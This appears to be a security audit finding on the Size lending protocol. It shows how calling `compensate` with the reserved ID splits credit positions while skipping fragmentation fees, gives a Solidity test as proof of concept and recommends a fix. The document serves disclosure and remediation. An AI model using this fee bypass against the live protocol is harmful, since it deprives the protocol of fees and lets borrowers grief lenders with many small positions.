# Vulnerability details

## Impact
Users can use the compensation functionality to partially repay their debt, this can be done by calling `Size::compensate` while passing `creditPositionToCompensateId` as `RESERVED_ID`, [docs](https://docs.size.credit/technical-docs/contracts/3.4-repayment#id-3.4.2-partial-repayment-via-compensation). This splits the credit and the corresponding debt position, into smaller positions, so later on, the user can repay each position by itself.

This contains fragmentation as the credit is being split, however, the logic to charge fragmentation fees in the context of a "partial repayment" with compensation is wrong. In `executeCompensate`, `amountToCompensate` is being compared with `creditPositionToCompensate.credit` to check if there should be fragmentation fees to be paid, but in the case of `RESERVED_ID`, `creditPositionToCompensate` is being created with the same credit as `executeCompensate` in an earlier if block, so `amountToCompensate` will equal `creditPositionToCompensate.credit`, i.e. no fragmentation fees will be paid.

Bypassing fragmentation fees allows borrowers to grief lenders by splitting their credit positions into numerous smaller positions, which forces the lender to claim multiple times upon repayment or liquidation.

## Proof of Concept

```solidity
function test_compensate_no_fragmentation_fees_paid() public {
    _deposit(alice, weth, 100e18);
    _deposit(bob, usdc, 500e6);

    int256[] memory aprs = new int256[](1);
    uint256[] memory tenors = new uint256[](1);
    uint256[] memory marketRateMultipliers = new uint256[](1);

    aprs[0] = 0.2e18;
    tenors[0] = 365 days;
    marketRateMultipliers[0] = 0;

    // Bob creates a limit order
    vm.prank(bob);
    size.buyCreditLimit(
        BuyCreditLimitParams({
            curveRelativeTime: YieldCurve({
                tenors: tenors,
                marketRateMultipliers: marketRateMultipliers,
                aprs: aprs
            }),
            maxDueDate: block.timestamp + 365 days
        })
    );

    // Alice sells credit to Bob (borrows from Bob)
    vm.prank(alice);
    size.sellCreditMarket(
        SellCreditMarketParams({
            lender: bob,
            creditPositionId: type(uint256).max,
            tenor: 365 days,
            amount: 100e6,
            exactAmountIn: true,
            deadline: block.timestamp,
            maxAPR: type(uint256).max
        })
    );

    uint256 creditPositionId = type(uint256).max / 2;

    // Credit position's credit is 100 USDC
    assertEq(size.getCreditPosition(creditPositionId).credit, 100e6);

    uint256 feeRecipientBalanceBefore = size
        .data()
        .collateralToken
        .balanceOf(feeRecipient);

    // Alice splits the credit position in two
    vm.prank(alice);
    size.compensate(
        CompensateParams({
            creditPositionWithDebtToRepayId: creditPositionId,
            creditPositionToCompensateId: type(uint256).max,
            amount: 50e6
        })
    );

    uint256 newCreditPositionId = creditPositionId + 1;

    // No fees were paid
    assertEq(
        size.data().collateralToken.balanceOf(feeRecipient),
        feeRecipientBalanceBefore
    );

    // Old credit position's credit is 50 USDC
    // New credit position's credit is 50 USDC
    assertEq(size.getCreditPosition(newCreditPositionId).credit, 50e6);
    assertEq(size.getCreditPosition(creditPositionId).credit, 50e6);
}
```

## Recommended Mitigation Steps

In `executeCompensate`, instead of comparing `amountToCompensate` with the newly created credit position, compare it with the original credit position's credit, i.e. `getCreditPosition(params.creditPositionWithDebtToRepayId)`.
